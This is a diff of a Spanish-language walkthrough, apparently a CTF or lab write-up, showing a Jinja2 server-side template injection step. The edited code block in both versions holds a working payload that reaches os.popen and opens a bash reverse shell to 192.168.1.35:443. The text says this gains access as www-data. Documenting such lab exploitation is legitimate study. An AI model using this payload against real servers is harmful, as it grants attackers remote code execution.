@@ -102,8 +102,8 @@ Referencia de SSTI Jinja2: [Jinja2 SSTI - HackTricks](https://book.hacktricks.xy
 
 - Teniendo presente un SSTI lo usaremos para ganar acceso al sistema montándonos una `reverse shell` creando otro ticket que contenga la siguiente inyección:
 
-```js
------------>{% ///for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/192.168.1.35/443 0>&1'").read()}}{%endif%}{% endfor %}
+```bash
+----------->"""{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/192.168.1.35/443 0>&1'").read()}}{%endif%}{% endfor %}"""
 ```
 
 - Habiendo hecho esto estando en escucha en nuestra máquina atacante ganaremos acceso al sistema como el usuario `"www-data"`.
